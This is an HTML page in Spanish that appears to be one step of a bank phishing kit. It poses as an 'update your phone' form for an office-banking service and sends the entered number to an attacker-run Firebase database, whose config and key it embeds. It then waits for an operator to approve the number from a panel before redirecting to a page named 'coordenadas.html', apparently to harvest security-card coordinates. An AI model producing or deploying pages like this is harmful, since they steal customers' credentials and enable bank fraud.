
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Actualizar Teléfono</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    h2 {
      text-align: center;
      margin-bottom: 1rem;
    }
    input[type="tel"] {
      width: 200px;
      font-size: 20px;
      padding: 10px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 5px;
      margin-bottom: 1rem;
    }
    button {
      padding: 10px 20px;
      background: red;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .loading {
      font-size: 18px;
      color: red;
      margin-top: 2rem;
      display: none;
    }
    .dots span {
      font-weight: bold;
      animation: blink 1s infinite;
    }
    .dots span:nth-child(2) { animation-delay: 0.2s; }
    .dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0% { opacity: 0; }
      50% { opacity: 1; }
      100% { opacity: 0; }
    }
  </style>
</head>
<body>
  <h2>Necesitamos actualizar tu teléfono</h2>
  <input type="tel" id="telefono" oninput="this.value = this.value.replace(/\D/g, '').slice(0,9);" placeholder="9 dígitos" maxlength="9" pattern="\d{9}" />
  <button onclick="enviarTelefono()">Enviar</button>

  <div class="loading" id="loading">
    Cargando<span class="dots"><span>.</span><span>.</span><span>.</span></span>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function enviarTelefono() {
      const telefono = document.getElementById("telefono").value;
      if (telefono.length !== 9 || isNaN(telefono)) {
        alert("Ingresa un teléfono válido de 9 dígitos.");
        return;
      }

      // Guardar teléfono en Firebase
      db.ref("telefonoTemp").set(telefono);
      document.getElementById("loading").style.display = "block";

      // Esperar aprobación desde el panel
      db.ref("validacion").on("value", (snapshot) => {
        const estado = snapshot.val();
        if (estado === "correcto") {
          window.location.href = "coordenadas.html";
        } else if (estado === "incorrecto") {
          window.location.href = "error.html";
        }
      });
    }
  </script>
</body>
</html>
